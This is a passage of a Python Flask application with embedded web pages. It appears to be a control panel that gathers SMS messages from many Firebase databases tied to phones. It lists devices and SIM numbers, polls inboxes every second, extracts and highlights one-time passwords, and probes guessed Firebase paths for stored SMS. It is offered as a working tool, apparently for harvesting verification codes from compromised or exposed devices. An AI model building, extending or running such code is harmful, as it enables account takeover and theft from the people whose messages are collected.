    document.getElementById('loading-text').classList.add('hidden');
    document.getElementById('list-content').classList.remove('hidden');
    renderNumbers();
  }catch(e){ document.getElementById('loading-text').innerHTML = '❌ Network error'; }
}

function renderNumbers(){
  const q = (document.getElementById('search-num').value || '').toLowerCase();
  const box = document.getElementById('num-list');
  const filtered = numbers.filter(n => !q || (n.number||'').toLowerCase().includes(q) || (n.device_name||'').toLowerCase().includes(q));
  if(filtered.length === 0){ box.innerHTML = '<div class="empty">📭 No numbers</div>'; return; }
  box.innerHTML = filtered.map(n => {
    const isOnline = n.online === true;
    const isUnknown = (n.number || '').startsWith('UNKNOWN-');
    const iconCls = isUnknown ? 'gray' : (isOnline ? '' : 'red');
    const badgeCls = isOnline ? 'badge-online' : 'badge-offline';
    const badgeTxt = isOnline ? 'Online' : 'Offline';
    const titleCls = isUnknown ? 'unknown' : '';
    return `
      <div class="num-card">
        <div class="num-icon ${iconCls}" onclick="openInboxGlobal(${numbers.indexOf(n)})">${isUnknown ? '❓' : '📶'}</div>
        <div class="num-info" onclick="openInboxGlobal(${numbers.indexOf(n)})">
          <div class="num-title ${titleCls}">${escapeHtml(n.number)}</div>
          <div class="num-sub">
            <span class="pill">📨 ${n.msg_count} SMS</span>
            ${n.otp_count > 0 ? `<span class="pill otp">🔑 ${n.otp_count} OTP</span>` : ''}
          </div>
        </div>
        <div class="card-actions">
          <button class="raw-btn" onclick="event.stopPropagation();openRawData(${numbers.indexOf(n)})" title="Raw Data">🔍</button>
        </div>
        <div class="${badgeCls}" onclick="openInboxGlobal(${numbers.indexOf(n)})"><span class="dot"></span>${badgeTxt}</div>
      </div>
    `;
  }).join('');
}

function openRawData(idx){
  if(idx < 0 || idx >= numbers.length) return;
  const n = numbers[idx];
  const url = '/debug?fb=' + encodeURIComponent(n.firebase) + '&id=' + encodeURIComponent(n.device_id);
  window.open(url, '_blank');
}

function openInboxGlobal(idx){ if(idx < 0 || idx >= numbers.length) return; openInbox(numbers[idx]); }

async function openInbox(n){
  currentNum = n; lastInboxSig = '';
  document.getElementById('list-view').classList.add('hidden');
  document.getElementById('inbox-view').classList.remove('hidden');
  document.getElementById('inbox-num').textContent = n.number;
  const statusEl = document.getElementById('inbox-status'); const statusTxt = document.getElementById('inbox-status-text');
  if(n.online === true){ statusEl.className = 'inbox-status'; statusTxt.textContent = 'Online'; }
  else { statusEl.className = 'inbox-status offline'; statusTxt.textContent = 'Offline'; }
  document.getElementById('sms-container').innerHTML = '<div class="empty"><span class="spinner"></span> Loading...</div>';
  await loadInbox(false);
  if(refreshTimer) clearInterval(refreshTimer);
  refreshTimer = setInterval(()=>loadInbox(false), 1000);
}

function findTopNumber(msgs){
  const counter = {};
  const senderNums = new Set();
  msgs.forEach(m => {
    const from = m.from || '';
    const found = from.match(/(?<!\d)([6-9]\d{9})(?!\d)/g) || [];
    found.forEach(n => senderNums.add(n));
  });
  msgs.forEach(m => {
    const text = m.message || '';
    const found = text.match(/(?<!\d)([6-9]\d{9})(?!\d)/g) || [];
    found.forEach(n => {
      if(senderNums.has(n)) return;
      if(n.startsWith('1800') || n.startsWith('1900') || n.startsWith('1991')) return;
      counter[n] = (counter[n] || 0) + 1;
    });
  });
  let topNum = null, topCount = 0;
  for(const [num, cnt] of Object.entries(counter)){
    if(cnt > topCount){ topNum = num; topCount = cnt; }
  }
  return topNum ? {number: topNum, count: topCount} : null;
}

function updateTopNumberBadge(msgs){
  const badge = document.getElementById('top-number-badge');
  const top = findTopNumber(msgs);
  if(top && top.count >= 2){
    document.getElementById('tn-num').textContent = '📞 ' + top.number;
    document.getElementById('tn-count-badge').textContent = top.count + ' bar';
    badge.classList.remove('hidden');
  } else {
    badge.classList.add('hidden');
  }
}

async function loadInbox(showLoader){
  if(!currentNum) return;
  if(showLoader){ document.getElementById('sms-container').innerHTML = '<div class="empty"><span class="spinner"></span> Refreshing...</div>'; }
  const controller = new AbortController(); const timeoutId = setTimeout(() => controller.abort(), 15000);
  try{
    const r = await fetch('/api/inbox?fb=' + encodeURIComponent(currentNum.firebase) + '&id=' + encodeURIComponent(currentNum.device_id) + '&num=' + encodeURIComponent(currentNum.number), { signal: controller.signal });
    clearTimeout(timeoutId); const d = await r.json();
    if(!d.success){ document.getElementById('sms-container').innerHTML = '<div class="empty">❌ '+(d.error||'Error')+'</div>'; return; }
    const msgs = d.messages || [];
    const sig = msgs.map(m => (m.timestamp||0) + '|' + (m.message||'').slice(0,40)).join('#');
    if(sig !== lastInboxSig){ lastInboxSig = sig; renderMessages(msgs); }
  }catch(e){ clearTimeout(timeoutId); }
}

function renderMessages(msgs){
  const box = document.getElementById('sms-container');
  const now = Math.floor(Date.now() / 1000);
  let list = [...msgs].sort((a, b) => (b.timestamp||0) - (a.timestamp||0)).slice(0, 60);
  updateTopNumberBadge(list);
  if(!list.length){ box.innerHTML = '<div class="empty">📭 No SMS</div>'; return; }
  box.innerHTML = '<div class="sms-list">' + list.map(m => {
    const otp = m.otp || extractOtp(m.message);
    const body = otp ? escapeHtml(m.message).replace(otp, `<span class="otp-highlight">${otp}</span>`) : escapeHtml(m.message);
    const copyBtn = otp ? `<button class="otp-copy-btn" onclick="copyOtp('${otp}')">📋 Copy OTP ${otp}</button>` : '';
    const ts = m.timestamp || 0; const isFresh = ts >= (now - 120);
    const timeStr = m.date_string ? m.date_string : fmtTime(ts);
    const newBadge = isFresh ? '<span class="new-badge">NEW</span>' : '';
    return `
      <div class="sms-item ${isFresh?'fresh':''}">
        <div class="sms-head">
          <div class="sender">${escapeHtml(m.from || 'Unknown')} ${newBadge}</div>
          <div class="sms-time">${escapeHtml(timeStr)}</div>
        </div>
        <div class="sms-body">${body}</div>
        ${copyBtn}
      </div>
    `;
  }).join('') + '</div>';
}

function backToList(){
  document.getElementById('inbox-view').classList.add('hidden');
  document.getElementById('list-view').classList.remove('hidden');
  if(refreshTimer){ clearInterval(refreshTimer); refreshTimer = null; }
  currentNum = null;
}

function extractOtp(text){
  if(!text) return '';
  const t = String(text);
  let m = t.match(/(?:otp|one[- ]time|password|code|pin|verification|passcode)[^\d]{0,30}(\d{4,8})/i);
  if(m) return m[1];
  m = t.match(/(\d{4,8})[^\d]{0,30}(?:is your|otp|one[- ]time|code)/i);
  if(m) return m[1];
  m = t.match(/#(\d{4,8})/);
  if(m) return m[1];
  return '';
}

function fmtTime(ts){
  if(!ts) return '';
  try{
    let t = parseInt(ts);
    if(t > 1e12) t = Math.floor(t/1000);
    if(t < 1e9) return String(ts);
    const d = new Date(t * 1000);
    const opts = { timeZone: 'Asia/Kolkata', hour12: true, day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit' };
    return d.toLocaleString('en-IN', opts).replace(',', ' |');
  }catch(e){ return String(ts); }
}

function copyOtp(code){
  const done = ()=>toast('✅ Copied: ' + code);
  if(navigator.clipboard){ navigator.clipboard.writeText(code).then(done).catch(()=>{ const ta = document.createElement('textarea'); ta.value = code; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); ta.remove(); done(); }); }
}

function escapeHtml(s){ return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]); }

loadFirebase();
setInterval(loadFirebase, 30000);
</script>
</body>
</html>
"""


# ==================== DEBUG HTML ====================
DEBUG_HTML = r"""<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>Raw Data Explorer</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
<style>*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,system-ui,sans-serif}
body{background:#0f172a;color:#e2e8f0;min-height:100vh;padding:14px}
.wrap{max-width:900px;margin:0 auto}
h1{font-size:15px;font-weight:700;color:#a5b4fc;margin-bottom:6px}
.sub{font-size:12px;color:#64748b;margin-bottom:14px;word-break:break-all}
.card{background:#1e293b;border:1px solid #334155;border-radius:10px;padding:12px;margin-bottom:10px;font-size:12px}
.path{color:#fbbf24;font-weight:700;margin-bottom:6px;font-family:monospace;word-break:break-all}
.status-ok{color:#4ade80;font-weight:600;margin-bottom:6px}
.status-empty{color:#f87171;font-weight:600;margin-bottom:6px}
.data{background:#0f172a;border:1px solid #1e293b;border-radius:8px;padding:10px;color:#cbd5e1;font-family:monospace;font-size:10px;white-space:pre-wrap;word-break:break-word;max-height:400px;overflow-y:auto}
.summary{background:#1e1b4b;border:1px solid #4338ca;border-radius:10px;padding:14px;margin-bottom:14px;font-size:13px}
.summary b{color:#c4b5fd}
.back{display:inline-block;padding:10px 14px;background:#334155;color:#e2e8f0;text-decoration:none;border-radius:8px;font-size:12px;margin-bottom:12px}
.spinner{display:inline-block;width:14px;height:14px;border:2px solid #334155;border-top-color:#818cf8;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:6px}
@keyframes spin{to{transform:rotate(360deg)}}</style></head><body>
<div class="wrap">
<a href="/firebases" class="back">← Back</a>
<h1>🔍 Raw Data Explorer</h1>
<div class="sub" id="sub">Loading...</div>
<div class="summary" id="summary" style="display:none">Scanning...</div>
<div id="results"></div>
</div>
<script>
const params = new URLSearchParams(window.location.search);
const FB = params.get('fb');
const DEV = params.get('id');
document.getElementById('sub').textContent = 'Device: ' + DEV;
async function scan(){
  const results = document.getElementById('results');
  results.innerHTML = '<div class="card"><span class="spinner"></span>Scanning...</div>';
  try{
    const r = await fetch('/api/rawdata?fb=' + encodeURIComponent(FB) + '&id=' + encodeURIComponent(DEV));
    const d = await r.json();
    if(!d.success){ results.innerHTML = '<div class="card status-empty">❌ '+(d.error||'Error')+'</div>'; return; }
    document.getElementById('summary').style.display = 'block';
    document.getElementById('summary').innerHTML = `🔎 <b>${d.scanned} paths</b> scanned — <b>${d.found}</b> with data`;
    results.innerHTML = d.results.map(item => {
      const cls = item.status === 'has_data' ? 'status-ok' : 'status-empty';
      const statusTxt = item.status === 'has_data' ? '✅ HAS DATA' + (item.message_count ? ` — ${item.message_count} msgs` : '') : '⚪ Empty';
      const dataTxt = item.data ? JSON.stringify(item.data, null, 2).slice(0, 3000) : '';
      return `<div class="card"><div class="path">${item.path}</div><div class="${cls}">${statusTxt}</div>${dataTxt ? `<div class="data">${escapeHtml(dataTxt)}</div>` : ''}</div>`;
    }).join('');
  }catch(e){ results.innerHTML = '<div class="card status-empty">❌ Network error</div>'; }
}
function escapeHtml(s){ return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]); }
scan();
</script>
</body></html>
"""


# ==================== ROUTES ====================
@app.route("/login", methods=["GET", "POST"])
def login_page():
    if session.get("logged_in") and session.get("role") == "user":
        return redirect(url_for("user_dashboard"))
    error = ""
    if request.method == "POST":
        pwd = request.form.get("password", "")
        if pwd == get_pwd("user"):
            session["logged_in"] = True
            session["role"] = "user"
            return redirect(url_for("user_dashboard"))
        error = '<div class="err">❌ Wrong password!</div>'
    return Response(LOGIN_HTML.replace("__ERROR__", error), mimetype="text/html")


@app.route("/admin", methods=["GET", "POST"])
def admin_login_page():
    if session.get("logged_in") and session.get("role") == "admin":
        return redirect(url_for("admin_dashboard"))
    error = ""
    if request.method == "POST":
        pwd = request.form.get("password", "")
        if pwd == get_pwd("admin"):
            session["logged_in"] = True
            session["role"] = "admin"
            return redirect(url_for("admin_dashboard"))
        error = '<div class="err">❌ Wrong admin password!</div>'
    return Response(ADMIN_LOGIN_HTML.replace("__ERROR__", error), mimetype="text/html")


@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login_page"))


@app.route("/")
@login_required
def user_dashboard():
    return Response(USER_DASHBOARD_HTML, mimetype="text/html")


@app.route("/otp")
def personal_otp():
    return Response(PERSONAL_OTP_HTML, mimetype="text/html")


@app.route("/admin/dashboard")
@admin_required
def admin_dashboard():
    return Response(ADMIN_DASHBOARD_HTML, mimetype="text/html")


@app.route("/admin/security")
@admin_required
def admin_security():
    return Response(SECURITY_HTML, mimetype="text/html")


@app.route("/firebases")
@admin_required
def firebases_page():
    return Response(FIREBASES_HTML, mimetype="text/html")


@app.route("/firebase/<fb_id>")
@admin_required
def firebase_view_page(fb_id):
    return Response(FIREBASE_VIEW_HTML.replace("{{FB_ID}}", fb_id), mimetype="text/html")


@app.route("/debug")
@admin_required
def debug_page():
    return Response(DEBUG_HTML, mimetype="text/html")


# ==================== API ROUTES ====================
@app.route("/api/conn")
def api_conn():
    return jsonify({"success": True, "mongo_connected": MONGO_OK})


@app.route("/api/refresh", methods=["POST"])
@login_required
def api_refresh():
    threading.Thread(target=refresh_cache, daemon=True).start()
    return jsonify({"success": True})


@app.route("/api/numbers")
@login_required
def api_numbers():
    with cache["lock"]:
        nums = list(cache["numbers_map"].values())
        stats = dict(cache["stats"])
        loading = cache["loading"]
        progress = dict(cache["progress"])
    if not nums and not loading:
        threading.Thread(target=refresh_cache, daemon=True).start()
    fb_total = 0
    if MONGO_OK:
        try:
            fb_total = fb_collection.count_documents({})
        except Exception:
            fb_total = 0
    return jsonify({
        "success": True, "numbers": nums,
        "total": stats.get("total", 0), "online": stats.get("online", 0),
        "offline": stats.get("offline", 0), "otp_rate": stats.get("otp_rate", 0),
        "loading": loading, "progress": progress, "firebases_total": fb_total,
    })


@app.route("/api/inbox")
def api_inbox():
    try:
        fb_url = request.args.get("fb", "").strip()
        dev_id = request.args.get("id", "").strip()
        num = request.args.get("num", "").strip()

        if not fb_url or not dev_id or not num:
            return jsonify({"success": False, "error": "fb, id, num required"}), 400

        key = f"{fb_url}|{dev_id}|{num}"
        now = time.time()

        with cache["lock"]:
            cached = cache["device_messages"].get(key)
            cached_at = cache["msg_cache_time"].get(key, 0)
            inbox_lock = cache["inbox_locks"].setdefault(key, threading.Lock())

        if cached and (now - cached_at) < MESSAGE_CACHE_TTL:
            return jsonify({"success": True, "messages": cached[:MAX_SMS_PER_NUMBER], "count": len(cached), "cached": True, "target_number": num})

        with inbox_lock:
            with cache["lock"]:
                cached = cache["device_messages"].get(key)
                cached_at = cache["msg_cache_time"].get(key, 0)
            if cached and (time.time() - cached_at) < MESSAGE_CACHE_TTL:
                return jsonify({"success": True, "messages": cached[:MAX_SMS_PER_NUMBER], "count": len(cached), "cached": True, "target_number": num})

            msgs = fetch_messages_multi_path(fb_url, dev_id, phone_numbers=[num])
            received = [m for m in msgs if m.get("type") == "received"]
            matched = received if received else msgs
            matched = sorted(matched, key=lambda x: x.get("timestamp", 0) or 0, reverse=True)
            for m in matched:
                m["otp"] = extract_otp(m.get("message", ""))
            matched = matched[:MAX_SMS_PER_NUMBER]

            with cache["lock"]:
                cache["device_messages"][key] = matched
                cache["msg_cache_time"][key] = time.time()

        return jsonify({"success": True, "messages": matched, "count": len(matched), "cached": False, "target_number": num})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


# ==================== PERSONAL OTP APIs ====================
@app.route("/api/otp/add", methods=["POST"])
def api_otp_add():
    if not MONGO_OK:
        return jsonify({"success": False, "error": "MongoDB down"}), 500
    try:
        data = request.get_json() or {}
        url = (data.get("url") or "").strip().rstrip("/")
        if url and not url.startswith("http"):
            url = "https://" + url
        if not url or "firebase" not in url:
            return jsonify({"success": False, "error": "Invalid firebase URL"}), 400
        if fb_collection.find_one({"url": url}):
            return jsonify({"success": True, "message": "Already in database", "hash": fb_hash(url)})
        name = url.replace("https://", "").split(".")[0][:30]
        fb_collection.insert_one({
            "url": url, "name": name,
            "added_at": int(time.time()),
            "source": "personal_otp",
        })
        threading.Thread(target=refresh_cache, daemon=True).start()
        return jsonify({"success": True, "hash": fb_hash(url)})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


@app.route("/api/otp/data", methods=["POST"])
def api_otp_data():
    try:
        data = request.get_json() or {}
        urls = data.get("urls", [])
        if not isinstance(urls, list) or not urls:
            return jsonify({"success": False, "error": "No firebase URLs provided"}), 400

        all_numbers = []
        total_online = 0
        total_offline = 0
        total_otp = 0
        total_msg = 0

        for url in urls[:20]:
            try:
                devices = fetch_devices_from_one_fb(url, "user_fb", "")
                for dev in devices:
                    is_dev_online = dev.get("online", False)
                    if is_dev_online: total_online += 1
                    else: total_offline += 1
                    for sim in dev.get("sims", []):
                        num = sim["number"]
                        msgs = dev.get("per_number", {}).get(num, [])
                        otp_count = sum(1 for m in msgs if extract_otp(m.get("message", "")))
                        total_otp += otp_count
                        total_msg += len(msgs)
                        all_numbers.append({
                            "number": num,
                            "device_id": dev["id"],
                            "device_name": dev.get("name", ""),
                            "firebase": url,
                            "online": is_dev_online,
                            "msg_count": len(msgs),
                            "otp_count": otp_count,
                            "confidence": sim.get("confidence", 0),
                        })
            except Exception as e:
                print(f"otp data error: {e}")
                continue

        seen = set()
        unique_numbers = []
        for n in all_numbers:
            key = n["number"]
            if key in seen: continue
            seen.add(key)
            unique_numbers.append(n)

        otp_rate = int((total_otp / total_msg) * 100) if total_msg > 0 else 0

        return jsonify({
            "success": True,
            "numbers": unique_numbers,
            "total": len(unique_numbers),
            "online": sum(1 for n in unique_numbers if n.get("online")),
            "offline": sum(1 for n in unique_numbers if not n.get("online")),
            "otp_rate": otp_rate,
        })
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


@app.route("/api/rawdata")
@admin_required
def api_rawdata():
    fb_url = request.args.get("fb", "").strip()
    dev_id = request.args.get("id", "").strip()
    if not fb_url or not dev_id:
        return jsonify({"success": False, "error": "fb and id required"}), 400
    base = fb_url.rstrip("/")
    paths = [
        f'/messages/{dev_id}.json?orderBy="$key"&limitToLast=60',
        f"/messages/{dev_id}.json", f"/clients/{dev_id}.json",
        f"/clients/{dev_id}/messages.json", f"/clients/{dev_id}/sms.json",
        f"/clients/{dev_id}/inbox.json", f"/clients/{dev_id}/receivedSms.json",
        f"/clients/{dev_id}/received.json", f"/clients/{dev_id}/incoming.json",
        f"/clients/{dev_id}/sms_history.json", f"/clients/{dev_id}/history.json",
        f"/clients/{dev_id}/logs.json", f"/inbox/{dev_id}.json",
        f"/received/{dev_id}.json", f"/sms/{dev_id}.json", "/clients.json?shallow=true",
    ]
    results = []
    found = 0
    for p in paths:
        url = base + p
        data = try_json(url, timeout=8)
        item = {"path": p, "data": None, "message_count": 0, "status": "not_found"}
        if data is None:
            item["status"] = "empty"
        else:
            item["data"] = data
            msgs = collect_all_messages(data)
            item["message_count"] = len(msgs)
            item["status"] = "has_data"
            found += 1
        results.append(item)
    return jsonify({"success": True, "scanned": len(paths), "found": found, "results": results})


@app.route("/api/security/change", methods=["POST"])
@admin_required
def api_security_change():
    data = request.get_json() or {}
    role = data.get("role", "").strip()
    pwd = data.get("password", "").strip()
    if role not in ("user", "admin"):
        return jsonify({"success": False, "error": "Invalid role"}), 400
    if not pwd or len(pwd) < 4:
        return jsonify({"success": False, "error": "Password too short (min 4 chars)"}), 400
    ok = set_pwd(role, pwd)
    if ok:
        return jsonify({"success": True, "message": f"{role} password saved to MongoDB"})
    return jsonify({"success": False, "error": "Failed to save password (MongoDB down)"}), 500


# ✅ Firebases list with per-firebase stats
@app.route("/api/firebases", methods=["GET"])
@admin_required
def api_fb_list():
    if not MONGO_OK:
        return jsonify({"success": False, "error": "MongoDB down"}), 500
    try:
        docs = list(fb_collection.find({}).sort("added_at", -1))
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500
    
    # ✅ Get cached stats
    with cache["lock"]:
        fb_stats = dict(cache["fb_stats"]) if cache["fb_stats"] else {}
    
    # Agar cache empty hai, toh background me fetch trigger karo
    if not fb_stats:
        threading.Thread(target=fetch_fb_stats, daemon=True).start()
    
    out = []
    for d in docs:
        url = d.get("url", "")
        fb_id = str(d["_id"])
        stats = fb_stats.get(fb_id, {"online": 0, "offline": 0, "devices": 0})
        out.append({
            "id": fb_id,
            "name": d.get("name", ""),
            "hash": fb_hash(url),
            "added_at": d.get("added_at", 0),
            "source": d.get("source", "admin"),
            "stats": stats,
        })
    return jsonify({"success": True, "firebases": out, "count": len(out)})


@app.route("/api/firebase/<fb_id>", methods=["GET"])
@admin_required
def api_fb_view(fb_id):
    if not MONGO_OK:
        return jsonify({"success": False, "error": "MongoDB down"}), 500
    try:
        doc = fb_collection.find_one({"_id": ObjectId(fb_id)})
    except Exception:
        return jsonify({"success": False, "error": "Invalid id"}), 400
    if not doc:
        return jsonify({"success": False, "error": "Not found"}), 404
    fb_url = doc.get("url", "")
    devices = fetch_devices_from_one_fb(fb_url, doc.get("name", ""), fb_id)
    numbers = []
    otp_total = 0
    online_count = 0
    offline_count = 0
    for dev in devices:
        is_dev_online = dev.get("online", False)
        if is_dev_online: online_count += 1
        else: offline_count += 1
        for sim in dev.get("sims", []):
            num = sim["number"]
            msgs = dev.get("per_number", {}).get(num, [])
            otp_count = sum(1 for m in msgs if extract_otp(m.get("message", "")))
            otp_total += otp_count
            numbers.append({"number": num, "device_id": dev["id"], "device_name": dev.get("name", ""), "firebase": fb_url, "online": is_dev_online, "msg_count": len(msgs), "otp_count": otp_count})
    return jsonify({
        "success": True, "id": fb_id,
        "name": doc.get("name", ""),
        "hash": fb_hash(fb_url),
        "device_count": len(devices),
        "online_count": online_count,
        "offline_count": offline_count,
        "number_count": len(numbers),
        "otp_count": otp_total,
        "numbers": numbers,
    })


@app.route("/api/firebases", methods=["POST"])
@admin_required
def api_fb_add():
    if not MONGO_OK:
        return jsonify({"success": False, "error": "MongoDB down"}), 500
    data = request.get_json() or {}
    url = (data.get("url") or "").strip().rstrip("/")
    if url and not url.startswith("http"):
        url = "https://" + url
    if not url or "firebase" not in url:
        return jsonify({"success": False, "error": "Invalid firebase URL"}), 400
    if fb_collection.find_one({"url": url}):
        return jsonify({"success": False, "error": "Already added"}), 409
    name = url.replace("https://", "").split(".")[0][:30]
    fb_collection.insert_one({"url": url, "name": name, "added_at": int(time.time()), "source": "admin"})
    threading.Thread(target=refresh_cache, daemon=True).start()
    return jsonify({"success": True})


@app.route("/api/firebases/bulk", methods=["POST"])
@admin_required
def api_fb_bulk():
    if not MONGO_OK:
        return jsonify({"success": False, "error": "MongoDB down"}), 500
    data = request.get_json() or {}
    urls = data.get("urls", [])
    added, skipped = 0, 0
    for u in urls:
        url = (u or "").strip().rstrip("/")
        if url and not url.startswith("http"):
            url = "https://" + url
        if not url or "firebase" not in url:
            continue
        if fb_collection.find_one({"url": url}):
            skipped += 1
            continue
        name = url.replace("https://", "").split(".")[0][:30]
        fb_collection.insert_one({"url": url, "name": name, "added_at": int(time.time()), "source": "admin_bulk"})
        added += 1
    threading.Thread(target=refresh_cache, daemon=True).start()
    return jsonify({"success": True, "added": added, "skipped": skipped})


@app.route("/api/firebases/<fb_id>", methods=["DELETE"])
@admin_required
def api_fb_delete(fb_id):
    if not MONGO_OK:
        return jsonify({"success": False, "error": "MongoDB down"}), 500
    try:
        doc = fb_collection.find_one({"_id": ObjectId(fb_id)})
        fb_url = doc.get("url", "") if doc else ""

        res = fb_collection.delete_one({"_id": ObjectId(fb_id)})
        if res.deleted_count == 0:
            return jsonify({"success": False, "error": "Not found"}), 404

        with cache["lock"]:
            cache["numbers_map"] = {}
            cache["devices"] = {}
            cache["device_messages"] = {}
            cache["msg_cache_time"] = {}
            cache["stats"] = {"total": 0, "online": 0, "offline": 0, "otp_rate": 0}
            cache["fb_stats"] = {}

        threading.Thread(target=refresh_cache, daemon=True).start()
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 400


@app.route("/api/firebases/bulk-delete", methods=["POST"])
@admin_required
def api_fb_bulk_delete():
    if not MONGO_OK:
        return jsonify({"success": False, "error": "MongoDB down"}), 500
    data = request.get_json() or {}
    ids = data.get("ids", [])
    deleted = 0
    for i in ids:
        try:
            res = fb_collection.delete_one({"_id": ObjectId(i)})
            deleted += res.deleted_count
        except Exception:
            pass

    with cache["lock"]:
        cache["numbers_map"] = {}
        cache["devices"] = {}
        cache["device_messages"] = {}
        cache["msg_cache_time"] = {}
        cache["stats"] = {"total": 0, "online": 0, "offline": 0, "otp_rate": 0}
        cache["fb_stats"] = {}

    threading.Thread(target=refresh_cache, daemon=True).start()
    return jsonify({"success": True, "deleted": deleted})


@app.route("/api/firebases/all", methods=["DELETE"])
@admin_required
def api_fb_delete_all():
    if not MONGO_OK:
        return jsonify({"success": False, "error": "MongoDB down"}), 500
    try:
        res = fb_collection.delete_many({})

        with cache["lock"]:
            cache["numbers_map"] = {}
            cache["devices"] = {}
            cache["device_messages"] = {}
            cache["msg_cache_time"] = {}
            cache["stats"] = {"total": 0, "online": 0, "offline": 0, "otp_rate": 0}
            cache["fb_stats"] = {}

        threading.Thread(target=refresh_cache, daemon=True).start()
        return jsonify({"success": True, "deleted": res.deleted_count})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port, debug=False, threaded=True)
